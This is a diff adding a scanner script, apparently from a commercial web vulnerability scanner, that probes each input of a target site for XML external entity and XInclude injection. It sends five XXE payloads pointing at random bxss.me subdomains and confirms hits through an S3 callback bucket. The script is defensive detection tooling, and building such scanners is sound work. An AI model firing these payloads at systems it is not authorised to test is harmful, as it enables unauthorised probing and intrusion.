@@ -1,0 +1,190 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+var targetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+targetUrl.path = scheme.path;
+targetUrl.getVar = "";
+var debug = false;
+{ // class for testing for XXE
+	function classXMLENTInjection(scheme, inputIndex){
+	
+		this.scheme = scheme;
+		this.inputIndex = inputIndex;
+		this.variations = scheme.selectVariationsForInput(inputIndex);
+		this.currentVariation = 0;
+		this.foundVulnOnVariation = false;
+		this.lastJob = null;
+	}
+	
+	classXMLENTInjection.prototype.getOrigValue = function()
+	{   
+	    var value = "";
+	    
+	    for (var i=0; i<this.variations.count; i++){
+	        var varValue = this.scheme.getVariation(this.variations.item(i)).item(this.inputIndex);
+	        
+	        // if the value is not yet set      
+	        if(value == "" && varValue != "") {
+	            value = varValue;                       
+	            //trace(value);
+	        }   
+	    }
+	    
+	    return value;
+	}	
+	
+	classXMLENTInjection.prototype.request = function(value)
+	{	
+		this.scheme.loadVariation(this.variations.item(this.currentVariation));
+		this.scheme.setInputValue(this.inputIndex, value);
+		this.lastJob = new THTTPJob();
+		this.lastJob.url = targetUrl;
+		//trace(this.lastJob.url.url);
+		scheme.populateRequest(this.lastJob);
+ 
+		this.lastJob.execute();
+        
+		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003))); 
+	}	
+	
+	classXMLENTInjection.prototype.verifyInjection = function(rndToken) {	
+		var http 		= new THTTPJob();
+		http.url 		= new TURL("http://bxss.s3.amazonaws.com/hits/" + rndToken);
+		http.verb 		= "GET";
+		http.timeout 	= 20000;
+		http.retries 	= 0;		
+		http.execute();
+		
+		//trace(http.url.url);
+		//trace(http.response.body);
+		
+		if (!http.wasError && http.response.body.startsWith("IP address:")){
+			return http.response.body;
+		}	
+		return false;
+	}
+	classXMLENTInjection.prototype.alert = function(testValue, subdomain, reqData)
+	{	
+		this.foundVulnOnVariation = true;
+		
+		var ri = new TReportItem();
+		ri.LoadFromFile("XML_External_Entity_Injection_And_XML_Injection2.xml");
+		ri.affects = this.scheme.path;
+		ri.alertPath = "Scripts/XML_External_Entity_Injection_And_XML_Injection2";
+		ri.parameter = this.scheme.getInputName(this.inputIndex);
+		ri.parameterValue = testValue;
+		
+		ri.setHttpInfo(this.lastJob);
+		
+		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold][break]";
+		if (subdomain) {
+			ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to XXE injection.";
+			if (reqData) {
+				ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";	
+			}
+		}
+		
+		//trace(ri.Details);
+		AddReportItem(ri);	
+	}		
+	
+	classXMLENTInjection.prototype.testInjection = function(value, rndToken, base64)
+	{
+        if (base64) value = plain2b64(value);
+        if (!this.request(value)) return false;
+        var reqData = this.verifyInjection(rndToken);
+        if (reqData) this.alert(value, rndToken, reqData);
+		return true;
+	}
+    function valueIsXML(input) {
+        return input && input.match(/^\s*</);
+    }
+	
+	classXMLENTInjection.prototype.startTesting = function()
+	{
+        for (var i = 0; i < this.variations.count; i++) {
+            var payloadEncodedBase64 = false;
+            var shouldTest = false;
+            var origValue = this.getOrigValue();
+            //trace(origValue);
+            // xml data?
+            if (valueIsXML(origValue) || (origValue == "" && this.scheme.hasPostData))
+                shouldTest = true;
+            // look for base64 encoded values
+            if (!shouldTest && origValue && origValue.length > 10)
+            {
+                var testValue = url2plain(b642plain(origValue));
+                //trace(testValue);
+                // xml data?
+                if (valueIsXML(testValue)) {
+                    shouldTest = true;
+                    payloadEncodedBase64 = true;
+                }
+            }
+            if (shouldTest) {
+                //trace('should test');
+                // [*] classic XXE test
+                var rndToken = 'hit' + randStr(10);
+                var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
+                payload = payload + '<!DOCTYPE acunetix [' + "\r\n";
+                payload = payload + '  <!ENTITY acunetixent SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
+                payload = payload + ']>' + "\r\n";
+                payload = payload + '<xxx>&acunetixent;</xxx>' + "\r\n";
+                // don't test further variations
+                if (this.foundVulnOnVariation) break;
+                this.currentVariation = i;
+                if (!this.testInjection(payload, rndToken, payloadEncodedBase64)) continue;
+                // [*] another XXE variation
+                rndToken = 'hit' + randStr(10);
+                payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
+                payload = payload + '  <!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://' + rndToken + '.bxss.me/">' + "\r\n";
+                payload = payload + '<roottag>acunetix</roottag>' + "\r\n";
+                // don't test further variations
+                if (this.foundVulnOnVariation) break;
+                this.currentVariation = i;
+                if (!this.testInjection(payload, rndToken, payloadEncodedBase64)) continue;
+                // [*] XInclude support
+                rndToken = 'hit' + randStr(10);
+                var payload = '<xi:include href="http://' + rndToken + '.bxss.me/" parse="text"/>';
+                // don't test further variations
+                if (this.foundVulnOnVariation) break;
+                this.currentVariation = i;
+                if (!this.testInjection(payload, rndToken, payloadEncodedBase64)) continue;
+                // [*] More XXE variations (parameter entities)
+                rndToken = 'hit' + randStr(10);
+                payload = '<?xml version="1.0" encoding="UTF-8"?>' + "\r\n";
+                payload = payload + '<!DOCTYPE foo [' + "\r\n";
+                payload = payload + '<!ELEMENT foo ANY >' + "\r\n";
+                payload = payload + '<!ENTITY % xxe SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
+                payload = payload + '%xxe;' + "\r\n";
+                payload = payload + ']>' + "\r\n";
+                // don't test further variations
+                if (this.foundVulnOnVariation) break;
+                this.currentVariation = i;
+                if (!this.testInjection(payload, rndToken, payloadEncodedBase64)) continue;
+                // [*] More XXE variations (DOCTYPE)
+                rndToken = 'hit' + randStr(10);
+                payload = '<?xml version="1.0" encoding="UTF-8"?>' + "\r\n";
+                payload = payload + '<!DOCTYPE body SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
+                payload = payload + '<body><method>test</method></body>' + "\r\n";
+                // don't test further variations
+                if (this.foundVulnOnVariation) break;
+                this.currentVariation = i;
+                if (!this.testInjection(payload, rndToken, payloadEncodedBase64)) continue;
+            }
+        }
+	}
+}
+// don't run if Amazon S3 is not reachable
+var AmazonS3Disabled = getGlobalValue("AmazonS3ScriptsDisabled");
+if (!AmazonS3Disabled) {
+    // main entry point
+    for (var i=0;i<scheme.inputCount; i++)
+    {
+        var tester = new classXMLENTInjection(scheme, i);
+        tester.startTesting();
+        ScriptProgress(ComputeProgress(i, scheme.inputCount));
+        tester = null;
+    }
+}
